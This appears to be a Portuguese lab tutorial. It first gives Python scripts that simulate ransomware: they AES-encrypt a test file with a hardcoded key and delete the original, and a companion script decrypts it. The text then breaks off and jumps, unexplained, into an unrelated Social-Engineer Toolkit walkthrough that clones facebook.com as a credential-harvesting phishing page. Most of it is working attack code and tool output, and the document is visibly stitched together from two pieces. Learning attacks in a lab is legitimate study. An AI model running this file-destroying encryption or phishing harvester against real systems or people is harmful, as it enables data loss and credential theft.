## Entendendo um Ransomware na prática com Python

**Ferramentas:**

- Ubuntu Linux
- Python 3

1. Crie um diretório para trabalhar em um ambiente controlado:

``` 
~/workspace$ mkdir encript-decript
~/workspace$ ls
```
> encript-decript

```
~/workspace$ cd encript-decript
```

2. Criando os arquivos:

```
~/workspace/encript-decript$ echo "Arquivo de texto não encriptado" > teste.txt
~/workspace/encript-decript$ nano encript.py
```

> código do arquivo encript.py:

```
import os
import pyaes

# Script para simular um Ransomware

# Função principal para encriptar o arquivo de teste.txt
# Inclui no laboratório um tratamento de erro try-except, mas em um cenário real não estariam
def encrypt_file(input_filename, output_filename, key):
    try:
        with open(input_filename, "rb") as original_file:
            aes = pyaes.AESModeOfOperationCTR(key)
            with open(output_filename, "wb") as encrypted_file:
                while True:
                    chunk = original_file.read(1024)  # Lê o arquivo em blocos de 1 KB
                    if not chunk:
                        break
                    encrypted_chunk = aes.encrypt(chunk)
                    encrypted_file.write(encrypted_chunk)
        
        # Remover o arquivo original após a criptografia bem-sucedida
        os.remove(input_filename)
        
        print(f"Arquivo '{input_filename}' criptografado com sucesso em '{output_filename}'")
    
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {str(e)}")

# Como é um laboratório, inclui a estrutura if __name__=="__main__"
# Dessa forma o código só será executado diretamente.

if __name__ == "__main__":
    original_file_name = "teste.txt"
    encrypted_file_name = original_file_name + ".ransomwaretroll"
    encryption_key = b"testeransomwares"

    encrypt_file(original_file_name, encrypted_file_name, encryption_key) # chamada da função aqui
```
>
```
~/workspace/encript-decript$ nano decript.py
```

> código do arquivo decript.py:

```
import os
import pyaes

# Script para simular o resgate de um arquivo encriptado por um Ransomware

# Função principal para descriptografar o arquivo de teste.txt
# Inclui no laboratório um tratamento de erro try-except, mas em um cenário real não estariam

def decrypt_file(input_filename, output_filename, key):
    try:
        with open(input_filename, "rb") as encrypted_file:
            aes = pyaes.AESModeOfOperationCTR(key)
            with open(output_filename, "wb") as decrypted_file:
                while True:
                    chunk = encrypted_file.read(1024)  # Lê o arquivo criptografado em blocos de 1 KB
                    if not chunk:
                        break
                    decrypted_chunk = aes.decrypt(chunk)
                    decrypted_file.write(decrypted_chunk)
        
        # Remover o arquivo criptografado após a descriptografia bem-sucedida
        os.remove(input_filename)
        
        print(f"Arquivo '{input_filename}' descriptografado com sucesso em '{output_filename}'")
    
    except Exception as e:
        print(f"Erro ao descriptografar o arquivo: {str(e)}")

# Como é um laboratório, inclui a estrutura if __name__=="__main__"
# Dessa forma o código só será executado diretamente.

if __name__ == "__main__":
    encrypted_file_name = "teste.txt.ransomwaretroll"
    decrypted_file_name = "teste.txt"
    decryption_key = b"testeransomwares"

    decrypt_file(encrypted_file_name, decrypted_file_name, decryption_key) # chamada da função aqui
```

3. Instalando bibilioteca **pyaes**:

```
~/workspace/encript-decript$ pip install pyaes
```
> Saída:

```
Defaulting to user installation because normal site-packages is not writeable
Collecting pyaes
  Downloading pyaes-1.6.1.tar.gz (28 kB)
  Preparing metadata (setup.py) ... done
Building wheels for collected packages: pyaes
  Building wheel for pyaes (setup.py) ... done
  Created wheel for pyaes: filename=pyaes-1.6.1-py3-none-any.whl size=26363 sha256=4abc28ef17fd9d7040d63936f1c746ab30653a3c0b62c643b69bc5cc6308f0f6
  Stored in directory: /home/meuUsuario/.cache/pip/wheels/d6/84/5f/ea6aef85a93c7e1922486369874f4740a5642d261e09c59140
Successfully built pyaes
Installing collected packages: pyaes
Successfully installed pyaes-1.6.1
```

4. Executando os scripts:

``` 
~/workspace/encript-decript$ ls
```
> Saída:
```
decript.py  encript.py  teste.txt
```
>
```
~/workspace/encript-decript$ python3 encript.py
```
> Saída:
```
Arquivo 'teste.txt' criptografado com sucesso em 'teste.txt.ransomwaretroll'
```
>
```
~/workspace/encript-decript$ ls
```
> Saída:
```
decript.py  encript.py  teste.txt.ransomwaretroll
```
>
```
~/workspace/encript-decript$ cat teste.txt.ransomwaretroll 
```
> Saída:
```
i�'|&`,N�x.Pw���/��,��i��
```
>
```
```






5. Selecionando o método de ataque no próximo menu, neste caso a **opção 3**: 
```
...

    1) Java Applet Attack Method
    2) Metasploit Browser Exploit Method 
    3) Credential Harvester Attack Method
    4) Tabnabbing Attack Method
    5) Web Jacking Attack Method
    6) Muiti-Attack Web Method
    7) HTA Attack Method

    99) Return to Main menu

set:webattack> 3
```

6. Selecionando o método de ataque no próximo menu, neste caso a **opção 2**, em seguida o IP do servidor <enter>. Depois, informe a URL a ser clonada **www.facebook.com** : 
```
...
    1) Web Templates
    2) Site Cloner
    3) Custom Import

    99) Return to Webattack menu

set:webattack> 2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as plac them into a report
...

set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.10.18]: <enter>
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone:http://www.facebook.com

[*] Cloning the website: https://login.facebook.com/login.php
[*] This could take a litle bit..

The best way to use this attack is if username and password from fields are available. 
Regardless, this captures all POST on a website

[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives bellow:
192.168.10.18 - - [08/10/2023 01:21:54] "GET / HTTP/1.1" 200 -
...
```

7. Pela **VM Windows** acesse o IP configurado, neste caso **192.168.10.18**

## Resutados:

![Alt text](prints/passwd.png "Captura de tela do setoolkit")

![Alt text](prints/passwd1.png "Captura de tela do setoolkit")


## Referências:

[Capturando senhas com Social Engineering Toolkit e Ettercap](https://www.nanoshots.com.br/2015/09/capturando-senhas-com-social.html)

[Git Cassiano](https://github.com/cassiano-dio/cibersecurity-desafio-phishing)

[Git Trustedsec](https://github.com/trustedsec/ptf )